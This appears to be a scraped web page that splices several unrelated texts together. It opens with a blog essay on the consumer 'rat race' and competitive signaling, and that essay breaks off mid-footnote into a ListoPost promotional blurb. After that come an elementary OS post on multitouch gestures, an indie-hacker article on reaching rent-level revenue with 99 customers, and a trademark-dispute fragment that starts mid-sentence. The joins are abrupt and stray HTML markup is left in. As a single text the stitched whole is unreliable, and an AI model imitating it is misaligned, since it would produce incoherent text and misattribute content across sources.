<p>As soon as we understand that all breathing humans worship money and stuff, the sooner we start to desire <a href="https://durmonski.com/psychology/why-we-hate-cheap-things/" target="_blank" aria-label="luxury items (opens in a new tab)" rel="noreferrer noopener">luxury items</a>. Not so much because they are useful, but because these fancy goods make us look like we are more.</p>



<p>And so it happens, that directly after we come into being, these values and principles get embedded in our brains and later influence our decisions. We want better and more beautiful things. But most of all, we want others to <em>see</em> that we actually own these marvelous objects.</p>



<p>This game of competitive signaling has become unbearable only recently. When the number of available choices vastly increased and the way we communicate with others (compare ourselves with them) significantly improved.</p>



<p>In this post, we’ll look at why we’re stuck in this competitive rat race. Why the desire to acquire new things is never tamed and what we can do about it. </p>



<p>By bringing awareness to the problems, I want to liberate more people from the destructive components of this never-ending race to the bottom.</p>







<h2>What is Rat Race Life?</h2>



<p>A modern rat race categorizes as an endless pursuit – often quite exhausting – where you earn small rewards by conspicuous behavior reinforced by acquiring more financial gains or possessions – or both. However, these gains never feel satisfactory enough. As new things constantly appear on the horizon – new products and new competitors who are also part of the race – the only way we can stay ahead of the curve is by constantly investing resources in this rivalry.</p>



<p>In a way, participating in this vain competition is required. After all, our survival is tightly related to the tools, the resources we personally own, plus the relationship we form with others. That’s why we stay devoted to the race – because deep inside, our genes are focused on survival and replication.</p>



<p>That’s the general concept of the modern rat race. Or in the words of Tyler Durden, the protagonist in the masterpiece Fight Club, “We buy things we don’t need with money we don’t have to impress people we don’t like.” But to really grasp the reasons we commit to a life of struggle over resources, we need to go a step deeper.</p>



<p>Let’s unpack the modern rat race ideology further…</p>







<h2>Why and How The Rat Race Was Formed?</h2>



<p>The first reference of the expression rat race was used in the 1930s during aviation training. As stated by Popular Science magazine in 1941, ‘A rat race is … a simple game of “follow the leader.'”<span id="easy-footnote-1-12306"></span><span><a href="#easy-footnote-bottom-1-12306" title="&amp;#8220;<a aria-label=&quot;Rat-race (opens in a new tab)&quot; rel=&quot;noreferrer noopener nofollow&quot; href=&quot;https://www.etymonline.com/search?q=rat+race&quot; target=&quot;_blank&quot; class=&quot;ek-link&quot;>Rat-race</a>&amp;#8220;. Online Etymology Dictionary."><sup>1</sup></a></span> Or in other words, the expression meant that the trainee fighter pilot had to copy all the actions performed by the senior pilot. </p>



<p>A decade later, the term changed its original meaning.</p>



<p>Nowadays, the expression is more closely related to how we live our lives day by day. We don’t simply “follow the leaders”, we compete with them. We want to be like them. To have what they have and to eventually beat them in the game of resources.</p>



<p>This fierce rivalry for wealth is inspired and fueled by three main motivators:</p>







<h3>1. The Genes Want to Survive</h3>



<p>We, our actions, are highly influenced by the desires of the microorganisms that form our bodies – our genes. According to Richard Dawkins, the author of <a aria-label="The Selfish Gene (opens in a new tab)" rel="noreferrer noopener" href="https://durmonski.com/book-summaries/the-selfish-gene/" target="_blank">The Selfish Gene</a>, “the main goal of the body is to propagate copies of the genes which ride inside it.” To achieve this feat, the body is required to strictly follow two commands: survive and replicate.</p>



<p>There is nothing more important for the genes. We live to live another day and to copy ourselves.</p>







<h3>2. Universal Recognition of Money</h3>



<p>Different religions exist in different countries but we are all loyal to one and only lord – the money lord. Or as Yuval Noah Harari writes in his bestseller, <a aria-label="Sapiens (opens in a new tab)" rel="noreferrer noopener" href="https://durmonski.com/book-summaries/sapiens-a-brief-history-of-humankind/" target="_blank">Sapiens</a>, “Money is the most universal and most efficient system of mutual trust ever devised.”</p>



<p>During the years of our existence, we form a love-hate relationship with money. On the one hand, we hate it when we see people who are willing to do whatever it takes to earn more and to gain more power. We have movies, literature, songs, and words that mock the aggressive pursuit of more cash.</p>



<p>On the other hand, however, we adequately recognize the need for this resource. Since money is the currency that can literally save our lives from misery and decay, we have no other choice but to obey some sort of rules to gain more of this finite resource. Even so, while it surely exists, our desire to get more money is usually not directly expressed. Throughout our lives, we learn to successfully decoy our desire for wealth. That’s actually why money is a taboo subject.</p>







<h3>3. Technological Advancements</h3>



<p>High-tech gizmos and the internet greatly exceeded our expectations. These two innovations enabled us to connected like no other species.</p>



<p>At first, we used the Wi-Fi connection to send emails and to communicate better. Now, we use it to showcase our self-worth and to advertise our qualities to the whole world. All of this, done with the underlying desire to feel more desirable by others.</p>

<p>The three above-mentioned notes can be portrayed in the following way:</p>

We show it by the stuff we obtain and the things we say/do.</figcaption></figure>







<p>Our inner eagerness to survive forces us to obtain money. And cash, supports our existence. But for most, the comfort of holding large chunks of capital in the bank is not enough. We also want to be seen as wealthy.</p>



<p>After all, just owning money is not enough to increase your chances of survival – meeting new friends that will help you along the way and also potential mates. That’s why, we’re also eager to parade with what we have.&nbsp;&nbsp;</p>



<p>Just as the peacock spreads its feathers to show its impeccable genes, we, through our actions and the things we acquire, show the world our features hoping that they’ll pick us. This our way of saying to others, “Look at me, my qualities and traits are so good that I can afford to spend $50,000 on a car. You should want to hang around with me.”</p>



<p>Our possessions are an advertisement, a way of showing off. They reinforce the image we desire to portray. And by going around and talking about ourselves, we want to signal to others – in a non-verbal way in most of the cases – why we are a worthy choice.</p>



<p>This is also called competitive signaling.</p>







<h2>What is Competitive Signaling?</h2>



<p>The way you spend your money can say a lot about how you want to position yourself in modern competition. </p>



<p>If you think carefully about everything before you buy it, and you’re not interested in high-end goods, your income is either average or you’re careless of what others think of you. In contrast, if you focus primarily on obtaining premium goods, you’re probably either rich or you want to be perceived as rich.<span id="easy-footnote-2-12306"></span><span><a href="#easy-footnote-bottom-2-12306" title="The last two are completely different things."><sup>2</sup></a></span></p>



<p>Thorstein Veblen, an American economist and sociologist, argued that the demand for luxury goods is driven largely by a single social motive: “flaunting one’s wealth.”</p>



<p>For example, Nissan is a car. It’s an average, not-flashy, automobile that will help you go from point A to point B, faster. Porsche, on the other hand, is an art museum on wheels. It can also get you from point A to point B, but while driving around town in this beast on wheels you radiate a completely different vibe. You present yourself as a modern, high-paid individual with taste and ambition. Figuratively speaking, the amount of cash that each of them has in the bank – the person owning a Nissan and the person owning a Porsche – can be exactly the same. On the outside though, they appear quite different.&nbsp;&nbsp;</p>



<p>The more interesting thing to consider, if say the individuals in the above example really do have the same amount of cash stashed, is how they approach buying domestic goods – a set of dishes, blankets, or say cleaning products. Since these goods are not to be seen by others, they both, even the person owning a sports car, will most probably end up getting the same cheap things.<span id="easy-footnote-3-12306"></span><span><a href="#easy-footnote-bottom-3-12306" title="This, of course, says a lot more things about their personality. For example, you can have an average income and still get a flashy car. But then, the things that are not visible by others will probably be average to compensate. Conversely, if you&amp;#8217;re <em>really</em> rich, you&amp;#8217;ll probably buy luxury domestic goods, too."><sup>3</sup></a></span></p>



<p>With this, we can conclude that the available products on the market are a mix of personal value and signaling value.</p>



<p>The car you have is simultaneously a way to move faster in the city and also a representation of your hierarchy in the world. Each product on the market, nowadays, comes with these qualities.</p>



<p>And if we can put this in a graph, it will look something like this:</p>

Luxury goods help you display, publicly, your wealth. The “scientific term” for this is conspicuous consumption.<span id="easy-footnote-4-12306"></span><span><a href="#easy-footnote-bottom-4-12306" title="<a aria-label=&quot;Conspicuous consumption (opens in a new tab)&quot; href=&quot;https://en.wikipedia.org/wiki/Conspicuous_consumption&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener nofollow&quot; class=&quot;ek-link&quot;>Conspicuous consumption</a>, Thorstein Veblen"><sup>4</sup></a></span></figcaption></figure>







<p>At some point, certain products become a beacon of your self-worth. If you want to signal to others that you have more money, which internally means that you want to show that you’re smarter, slimmer, better than others in a way, you’ll eventually lean towards goods that are considered a luxury.</p>



<p>The extra you’re paying for a Porche, for example, has more to do with the message you want to convey to others, not with the usefulness of the product itself.<span id="easy-footnote-5-12306"></span><span><a href="#easy-footnote-bottom-5-12306" title="We all know that Porche is certainly a great vehicle.

The Internet as we know it today is filled with walled gardens and data silos locking in all their users' data. When we publish online, our goal is often to reach the largest audience possible. So, why should we continue to submit our important content to restrictive platforms?
</p>

<p>
This is why we have been building ListoPost: a new platform to openly share content and data.  
</p>

Since we encourage all submitted posts to be shared far beyond our site, we also don't want to generate revenue via display ads and ask for a fee for distributing content.
</p>

<p>
<strong>Open content is accessible.</strong><br>

Our plan is to build a robust API to access all of this valuable openly licensed content. If you are interested in our API, please email us developers@listopost.com to tell us about your needs.

December 2, 2020 | https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/multitouch-gestures-in-elementary-os-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>One of the most hotly requested features for years has been to have multi-touch gestures in elementary OS, and with 6.0 I’m excited to say that we will deliver. Like the <a href="https://blog.elementary.io/dark-style-progress/">dark style preference</a>, delivering a great multi-touch experience is a little more complicated than it seems on the surface. There have been some 3rd party tools to detect touchpad gestures and then trigger actions after-the-fact, but it wasn’t until recently that we’ve had the technical ability to provide smooth, responsive animations that track 1:1 with your finger movement across a touchpad or touch screen.</p>

<h2 id="window-manager-gestures">Window Manager Gestures</h2>

<p>We’ve had the great pleasure of working with <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">José Expósito</a>, the author of Touchégg, on our window manager gestures. In elementary OS 6, we use Touchégg Daemon behind the scenes to capture input events and communicate them to Gala, our window manager.</p>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/multitasking.gif" alt="Multitasking View"></p>
  <figcaption>1:1 multi-touch gestures used for Multitasking View</figcaption>
</figure>

<p>At the moment, we’re reviewing two proposals: one for the multitasking view and another for switching workspaces directly. Both of these use 1:1 responsive, finger-tracking gestures that can be peeked or canceled at any time. When special animations aren’t available in the window manager, such as when tiling, we fall back to animations built in to Touchégg.</p>

  <figcaption>1:1 multi-touch gestures used for switching workspaces</figcaption>
</figure>

<p>We’re still discussing exactly what the default configuration should be, but work is already underway on System Settings so that you can choose whichever gestures feel most comfortable for you—or choose none at all.</p>

<p>If you’d like to support José’s work on multi-touch gestures for elementary OS 6—and other Linux-based operating systems—you can do so with as little as $2/mo on <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/sponsors/JoseExposito">GitHub Sponsors</a>.</p>



<h2 id="app-gestures">App Gestures</h2>

<p>In order to make gestures work globally, previous solutions have opted to emulate keyboard shortcuts after a gesture was completed. This is effective, but animations—if they’re provided at all—don’t feel connected to users’ input. Instead, in elementary OS 6 we’re making use of Handy, a library originally developed for <a rel="nofollow noopener noreferrer" target="_blank" href="https://puri.sm/">Purism</a> and their Open Source phone platform. This means that each app and desktop component must be updated to support gestures individually, which is ultimately a lot more work but a vastly superior experience.</p>

<h3 id="paging">Paging</h3>

<figure>
  <p><img src="https://blog.elementary.io/images/multitouch-gestures-in-elementary-os-6/appcenter.gif" alt="AppCenter Screenshots"></p>
  <figcaption>Paging screenshots in AppCenter</figcaption>
</figure>

<p>In elementary OS 5, we used Handy to add gestures for switching pages to the applications menu and during onboarding. So far, in elementary OS 6 this has been extended to the Date &amp; Time indicator to switch months in the calendar view and to AppCenter to switch between screenshots. This makes use of the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Carousel.html">Handy Carousel</a> widget which also provides a smooth transition between page indicator dots when needed. Our plan is to provide gestures any time pages are used and we’re already tracking issues for Calendar and more.</p>

<h3 id="navigation">Navigation</h3>

<p>Another place we’ve implemented gestures is while navigating between panes or views. This is using the <a rel="nofollow noopener noreferrer" target="_blank" href="https://valadoc.org/libhandy-1/Hdy.Deck.html">Handy Deck</a> widget which contains a concept of next and previous views and shows views in a neat stack. Swipe-to-go-back is now implemented in elementary OS 6 in Feedback, in the Installer and Initial Setup views for configuring locale variants, and in Systems Settings → Keyboard when adding new layouts. Gestures are also now available natively in WebkitGtk and therefore Epiphany also provides swipe navigation for both back and forward.</p>

<p>Some more complex navigation situations are in progress such as when navigating between views in System Settings itself and in AppCenter. There are also open issues for navigating in Files and Photos, but development hasn’t yet started there. Working with Handy Deck in these situations has exposed some inefficiencies in the way navigation was implemented previously so not only are we implementing a new feature, but the underlying code is being made more robust and optimized.</p>

<h3 id="other">Other</h3>

<p>We’re also looking into other uses for gestures as popularized in mobile operating systems, such as swipe to dismiss. In elementary OS 6, you can now dismiss notification bubbles from the desktop with a swipe, and remove them from the notifications indicator by swiping in either direction as well. We haven’t implemented swipe-to-dismiss in other types of lists yet, but we’re open to suggestions! You can follow along with our <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/orgs/elementary/projects/61">progress and plans on GitHub</a>, as well as file feature requests.</p>

<p>A quick note about pinch-to-zoom and rotate, at the moment we don’t yet have a way to implement these more complex gestures. We may have to wait until we can provide GTK4 in a Flatpak or for elementary OS 7 before it becomes possible to provide gestures for transforms.</p>

<p>Lastly, I just wanted to say thank you to <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/alexm_gnome">Alexander Mikhaylenko</a> for being available for questions and feature requests as we implement Handy in our apps. He’s been an essential resource and very open to improving Handy for our use cases.</p>

<h2 id="get-early-access">Get Early Access</h2>

<p>If you’re excited by what you read here and want to get your hands on the developer preview of elementary OS 6, you can! GitHub sponsors at the $10/mo or above tier get access to our <a rel="nofollow noopener noreferrer" target="_blank" href="https://builds.elementary.io/">daily builds server</a> where you can test the latest and greatest experimental builds, including builds for Pinebook Pro. Subscribing helps us fund the development of elementary OS and brings us that much closer to delivering the final product.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content-pane"><div><p>The founding stories of big tech companies get people pumped on the idea of starting their own thing, from <a href="https://en.wikipedia.org/wiki/Software_as_a_service" title="https://en.wikipedia.org/wiki/Software_as_a_service">SaaS</a> products to <a href="https://trends.vc/trends-0036-paid-newsletters/" title="https://trends.vc/trends-0036-paid-newsletters/">paid newsletters</a> . The concept sounds awesome. Build something, it picks up speed, and swiftly grows into a multi-million dollar company. It’s a crazy success story, you’re set for life! Silicon Valley has no shortage of examples to be gawked at: AirBnb, Amazon, Dropbox, Facebook, Google, Netflix, etc which all exploded in the last 15 years.</p><p>Once you start trying to create it, though, odds are your idea is not a runaway success. There are ideas where the problem is so important, so valuable, so sticky to businesses that you can give them the worst pile of garbage in the world and they will fork over bajillions of dollars. If you are in that camp and pulling in cash is as easy as drinking water, stop reading, this isn’t for you.</p><p>Getting users is really freakin’ hard. Getting customers who will pay you to use your idea is even harder. When you’re struggling to acquire new users, it’s frustrating to look at the big tech companies and realize they have millions, if not billions of users. How are you ever supposed to convince that many people your idea is awesome, but you’re struggling to get just 10.</p><p>Divorce yourself from the notion you need to match those giant tech companies. How many customers does it actually take to support one person? Is it a million? 100,000? 10,000? Try 99.</p><p>I’ll back it up with the math in a second, but for now, think about how awesome this is. 99 is an achievable number. You know more than 99 people on a first-name basis. You’ve waited in lines longer than 99 people! But, I’m just some guy on the internet saying this. Heck, for all you know I’m not actually a person, this is just a <a href="https://www.theverge.com/2020/8/16/21371049/gpt3-hacker-news-ai-blog" title="https://www.theverge.com/2020/8/16/21371049/gpt3-hacker-news-ai-blog">pile of words GPT-3 thinks sound nice together</a>. So let’s break it down and see how you only need 99 people’s support to make a drastic change to your life.</p><h2 id="assumptions--definitions">Assumptions &amp; Definitions</h2><p>Assumptions first. I’ll be calculating this for one person, but it should scale up if you have a team. When it comes to making money, I see several inflection points of Monthly Recurring Revenue (MRR).</p><ol><li>$1</li><li><strong>Beer Money (BM) MRR</strong> - $100</li><li><strong>Rent MRR</strong> - $1,000</li><li><strong>College Grad (CG) MRR</strong> - $5,000</li><li><strong>Magical (MA) MRR</strong> - $10,000</li></ol><p>Stage 1, you’ve made your first dollar. Somebody out there thinks your idea doesn’t suck. Celebrate this, it’s a big achievement! One caveat for your dollar, it does <strong>NOT</strong> count if it came from your mom.</p><p>At <strong>Beer Money MRR</strong>, you are making $100 every month. You have cracked the 3 digit barrier, and can buy a lot of beer/wine/cheese/whatever without feeling too guilty about your budget.</p><p><strong>Rent MRR</strong> is where things get good, this is $1,000 a month. In some places this isn’t enough to live on by itself, but it is life-changing money no matter where you are. It likely covers all or a good chunk of your rent, hence the name. If you are poo-pooing me for saying $1k MRR is a big deal, you should get your head out of your ass and look at the rest of the world outside your bubble.</p><p><strong>College Grad MRR</strong> is $5k a month. This is $60k a year, which is near the average for a college graduate in the U.S. and more importantly, the math is easy when it divides nice. No calculators needed to read this article!</p><p><strong>Magical MRR</strong> is the last stop for this train. This is $10k a month, which is a <strong>TON</strong> of money. You’ll have taxes and expenses and junk, but to have people paying you $120k a year to use your idea must feel fantastic. I call it magical because $10k gets thrown around a lot in indie hacker articles &amp; community as a magic number to reach.</p><h2 id="show-me-the-money">Show Me the Money!</h2><p>Ok we have some definitions locked in, now we’ll go through 2 product examples: <strong>Product A</strong> at $10 and <strong>Product B</strong> at $50, again keeping the math easy. This could be a <a href="https://en.wikipedia.org/wiki/Software_as_a_service" title="https://en.wikipedia.org/wiki/Software_as_a_service">SaaS</a> charging monthly, an eBook, a course, paid newsletter, whatever. We’re looking per month, so the specifics of what is pulling in the dough don’t matter for this article. I took a couple liberties to knock off 1 sale here and there to keep it to 2 or 3 digits, because seeing those inflection points is what inspires me personally. Only 2 digits of people? I can do that.</p><p><strong>Product A, $10:</strong></p><p><strong>BM =</strong> 10 people</p><p><strong>Rent =</strong> 99 people is all it takes</p><p><strong>CG =</strong> 500 people</p><p><strong>MA =</strong> 999 people a month need to feel like your idea is worth it</p><hr><p><strong>Product B, $50:</strong></p><p><strong>BM =</strong> 2 people</p><p><strong>Rent =</strong> 20 people is all it takes</p><p><strong>CG =</strong> 99 people</p><p><strong>MA =</strong> 200 people a month need to feel like your idea is worth it</p><p>You can reach a life changing amount of money from your side hustle, and you need to convince less than 1,000 people that what you do/create/build is worth it. It’s often thrown around that you need <a href="https://kk.org/thetechnium/1000-true-fans/" title="https://kk.org/thetechnium/1000-true-fans/">1,000 true fans</a>, or as the math would suggest, just 99. Out of <a href="https://www.worldometers.info/world-population/" title="https://www.worldometers.info/world-population/">7.8 billion</a> humans, you only need 99 in your corner to break the threshold to <strong>Rent MRR</strong>. It’s still a large group of people, don’t get me wrong. I would be terrified to give a speech to that crowd, but it’s small enough you can comprehend it. To make it even easier, let’s do some visualizations and connect these numbers to concrete concepts in our lives. Recognizing a connection with something you already know helps it feel achievable.</p><h3 id="20-people">20 People</h3><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>At some point in your life, you’ve been in a class greater than 20 people.</p><p>Your extended family gatherings are close to this many people.</p><p>You’ve likely been forced to give a presentation to <em>at least</em> this many listeners.</p><h3 id="99-people">99 People</h3><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>You’ve waited in lines longer than 99 people.</p><p>This is a small lecture hall, mostly full.</p><p>You could reasonably have a short conversation with 99 different people over the course of a day.</p><h3 id="200-people">200 People</h3><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️ - 🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️🙅‍♂️</p><p>A couple hundred people could fit in a crowded bar or a conference presentation.</p><p>You can know the names and faces of 200 people with very little effort.</p><p>The majority of you have <a href="https://brandongaille.com/17-great-facebook-friend-statistics/" title="https://brandongaille.com/17-great-facebook-friend-statistics/">more than 200 friends on Facebook</a>.</p><p>If you’ve ever worked in a customer facing job, you’ve probably talked to more than 200 people in one shift!</p><h3 id="500-people">500+ People</h3><p><a href="https://blog.lime.link/visualizing-crowd-sizes/" title="https://blog.lime.link/visualizing-crowd-sizes/">This article</a> gives a great rundown of audience sizes from 50 to 100k people, and it’ll have to cover for the 500+ user visualizations.

This is you making something awesome for all these people 👩‍💻 .</p><h2 id="the-real-world">The Real World</h2><p>The real world can be brutal when theories come into contact with it. It’s easy for me to sit here and talk about how you only need 99 customers to change your world, but you want to see something to back it up and show it still rings true out in the wild. Luckily, there are a lot of companies that share their stats as a part of being <a href="https://trends.vc/trends-0015-open-startups/" title="https://trends.vc/trends-0015-open-startups/">Open Startups</a>, many listed at <a href="https://openstartup.dev/" title="https://openstartup.dev/">https://openstartup.dev/</a> and <a href="https://baremetrics.com/open-startups" title="https://baremetrics.com/open-startups">https://baremetrics.com/open-startups</a>. You can also find great interviews on <a href="http://starterstory.com/" title="http://starterstory.com">starterstory.com</a>, where they go in-depth on how people started their businesses and their current revenue. Diving into a few data points from Nov 2020:</p><p>$1.3k : 124 users - <strong>Grip</strong> <a href="https://grip.baremetrics.com/" title="https://grip.baremetrics.com/"><em>https://grip.baremetrics.com/</em></a></p><p>$5.3k : 49 users - **Friendly **<a href="https://friendly.baremetrics.com/" title="https://friendly.baremetrics.com/"><em>https://friendly.baremetrics.com/</em></a></p><p>$7.0k : 144 users - <strong>Bannerbear</strong> <a href="https://www.bannerbear.com/open/" title="https://www.bannerbear.com/open/"><em>https://www.bannerbear.com/open/</em></a></p><p>$7.6k : 513 users - <strong>Simple Analytics</strong> <a href="https://simpleanalytics.com/open" title="https://simpleanalytics.com/open"><em>https://simpleanalytics.com/open</em></a></p><p>$9.0k : 479 users - <strong>Software Ideas</strong> (Paid reports/newsletter) <a href="https://softwareideas.baremetrics.com/" title="https://softwareideas.baremetrics.com/"><em>https://softwareideas.baremetrics.com/</em></a></p><p>$11k : 728 users - <strong>Hypefury</strong> <a href="https://hypefury.baremetrics.com/" title="https://hypefury.baremetrics.com/"><em>https://hypefury.baremetrics.com/</em></a></p><p>. . . . and then a crazy one</p><p>$<strong>133k</strong> : 871 users - **Baremetrics **<a href="https://demo.baremetrics.com/" title="https://demo.baremetrics.com/"><em>https://demo.baremetrics.com/</em></a></p><p>These companies are in all sorts of industries, they all have less than 1,000 users, and yet are making at minimum <strong>Rent MRR.</strong> While most of the Open Startups I listed are SaaS products built by developers, don’t be discouraged if you are non-technical or not interested in building software. There are examples out there of people growing non-technical products like ebooks, courses, newsletters, and more to sustain their livelihood if you take the time to look. Starter Story, mentioned above, is a collection of interviews &amp; ideas built up to <a href="https://www.starterstory.com/open" title="https://www.starterstory.com/open">$18k MRR in ~2 years</a>. Twitter and <a href="https://www.indiehackers.com/" title="https://www.indiehackers.com/">Indie Hackers</a> are great sources if you need even more inspiration.</p><h2 id="find-99-people-that-love-you">Find 99 people that love you</h2><p>If you haven’t gathered yet, the takeaway from all this is you don’t need to gun for crazy scale like the Facebooks of the world. You can aim to just support yourself. Find your true fans, as Kevin Kelley calls them in his essay <a href="https://kk.org/thetechnium/1000-true-fans/" title="https://kk.org/thetechnium/1000-true-fans/">1000 true fans</a>, and create for them.</p><p>This is not to trivialize the work needed to get to $100 MRR , or 10 users that love your product. It’s hard to get users. But making your vision more achievable helps keep the fire burning. It feels different pulling in the 1st of 99 people than the 1st of 100,000. So go forth and make something, you have the power and the global reach of the internet at your disposal. Go find 99 people that love your idea enough to pay you for it, and …</p></div></section></div>

It unveiled a new short-form online interview series called 'TIME100 Talks' which featured online interviews with journalists, talents and thought leaders. As the videos became popular, Time magazine began to branch out with this brand, establishing Time Talks for dedicated topics like health. Accordingly, they applied to have the trademark 'TIME100 Talks' registered with the United States Patents and Trademarks Office (USPTO). As of the date of this writing, the status of this application is still 'pending'.</span></p><p><span data-preserver-spaces="true">This success then attracted the ire of the New York Times, whose holding company has a registered trademark for the words' Times Talks'. The company, arguably most famous for its crosswords or angering the President, decided then to commence proceedings against Time magazine for trademark infringement.&nbsp;</span></p><p><span data-preserver-spaces="true">The main arguments that the courts will need to decide is whether TIME100 Talks is an infringement of 'Time Talks' or an extension of the trademark, 'TIME100'.&nbsp;</span></p><p><span data-preserver-spaces="true">It is a surprise that it has taken this long for the companies to meet regarding trademark infringement as the New York Times has been around since 1851 and Time magazine was first published in 1923. Since the commencement of both publications, they have both relied heavily on their marketing of the word 'time'.&nbsp;</span></p><p><span data-preserver-spaces="true">But what will happen if two established companies with consistent branding and registered trademarks go toe-to-toe in the boxing ring of justice? Well, most likely, not too much, as there is too much at stake. Generic usage of a trademark is the killer of all brands and one of the biggest threats to a company's intellectual property. Since 1788, the word Times has been used in relation to newspapers and the reporting of the news. It is one of the default placeholder names for a newspaper or publication with the location of the publication often preceding the word. In fact, Times began being used by newspapers in England before making it to New York, so it may be argued that it was always in common usage.&nbsp;</span></p><p><span data-preserver-spaces="true">Accordingly, if this were ever to make it to trial, both parties are at risk of having their registered trademarks cancelled if the court determines that it has fallen into generic usage. Going the way of the 'flip-phone', originally a Motorola trademark, when a trademark loses its distinguishing nature, it can often lead to an abandonment of the product/brand itself. Although this is admittedly, unlikely given the circumstances surrounding this matter, it is always worth considering.&nbsp;</span></p><p><span data-preserver-spaces="true">With this case, we will see soon whether the court determines that there is enough evidence to proceed to trial and whether each parties' trademarks are at risk.&nbsp;</span></p></div></div>

